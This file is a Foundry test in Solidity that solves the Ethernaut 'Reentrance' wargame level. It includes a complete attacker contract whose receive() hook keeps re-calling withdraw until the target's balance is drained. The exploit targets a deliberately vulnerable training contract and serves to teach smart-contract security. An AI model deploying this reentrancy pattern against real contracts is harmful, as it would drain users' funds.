// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {EthernautTest} from "./utils/EthernautTest-06.sol";
import {ReentranceFactory} from "../src/factories/ReentranceFactory.sol";
import {Reentrance} from "../src/levels/Reentrance.sol";

import "forge-std/console.sol";

contract ReentranceTest is EthernautTest {
    function setUp() public override {
        super.setUp();
        ReentranceFactory factory = new ReentranceFactory();
        ethernaut.registerLevel(factory);
        levelAddress = ethernaut.createLevelInstance{value: 0.001 ether}(
            factory
        );
    }

    function testSolveReentrance() public {
        Reentrance instance = Reentrance(payable(levelAddress));

        // [START]

        // 1. Deploy attacker contract
        ReentranceAttack attacker = new ReentranceAttack(payable(levelAddress));

        console.log(
            "[Before] balanceOf: ",
            instance.balanceOf(address(attacker))
        );
        console.log("[Before] LevelAddress balance: ", levelAddress.balance);

        // 2. Donate
        vm.startPrank(address(this));

        uint256 amount = 0.0005 ether;
        instance.donate{value: amount}(address(attacker));

        // 3. Withdraw
        attacker.withdraw(amount);

        vm.stopPrank();

        console.log(
            "[After] balanceOf: ",
            instance.balanceOf(address(attacker))
        );
        console.log("[After] LevelAddress balance: ", levelAddress.balance);

        // [END]

        assert(ethernaut.submitLevelInstance(payable(levelAddress)));
    }
}

// Attack contract
contract ReentranceAttack {
    Reentrance public target;
    uint256 public amount;

    constructor(address payable _target) public {
        target = Reentrance(_target);
    }

    function withdraw(uint256 _amount) public {
        amount = _amount;
        target.withdraw(_amount);
    }

    receive() external payable {
        if (address(target).balance > 0) {
            target.withdraw(amount);
        }
    }
}
